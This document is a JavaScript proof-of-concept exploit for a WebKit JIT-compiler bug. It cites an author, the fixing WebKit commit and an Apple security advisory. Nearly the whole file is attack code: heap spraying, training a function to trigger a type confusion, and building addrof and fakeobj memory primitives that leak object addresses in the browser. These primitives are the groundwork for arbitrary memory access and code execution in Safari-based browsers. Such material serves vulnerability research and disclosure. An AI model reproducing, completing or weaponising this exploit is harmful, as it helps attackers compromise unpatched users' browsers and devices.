/*
author: @po6ix
commit: https://github.com/WebKit/WebKit/commit/08d5d17c766ffc7ca6a7c833c5720eb71b427784
advisory: https://support.apple.com/en-us/HT213926
*/

let ref_arr = [];
for (let i = 0; i < 0x100; ++i) {
    let o = new Function(Math.random());
    o.p1 = 1.1;
    o[0] = 1.1;
    ref_arr.push(o);
}

let target = new Function(Math.random())
target.p1 = 1.1;
target[0] = {};

let a = {};
a.foo = 1;
a.p1 = 1.1;

let getter = () => {
    return 1337;
};
getter.p1 = 0x1337;
getter[0] = 1.1;

let shape = {};
for (let i = 0; i < 64; ++i) {
    shape['q'+i] = i;
}

let b = {};
b.__defineGetter__('p1', getter);
b.foo = 1;

function jitme(type) {
    let tmp;

    if (type == 0) {
        tmp = a;
    } else {
        tmp = b;
    }

    let x;
    for (let i = 0; i < 2; ++i) {
        if (type == 0) {
            x = tmp.foo;
        } else {
            x = tmp.foo;
        }
    }
    return x;
}

function main() {
    for (let i = 0; i < 1e7; ++i) {
        jitme(i % 2);
    }

    let getterSetter = jitme(1);
    let symbolObject = Object(getterSetter);

    for (let i = 0; i < 0xeb8; ++i) {
        ref_arr.push(symbolObject.description);
    }

    getter.q13 = 1.1;
    
    function addrof(o) {
        target[8] = o;
        return Int64.fromDouble(getter[0]);
    }

    function fakeobj(addr) {
        getter[0] = addr.asDouble();
        return target[8];
    }

    document.write(addrof({}).toString() + '<br>');
    document.write(addrof({}).toString() + '<br>');
    document.write(addrof({}).toString() + '<br>');
    document.write(addrof({}).toString() + '<br>');
}
main();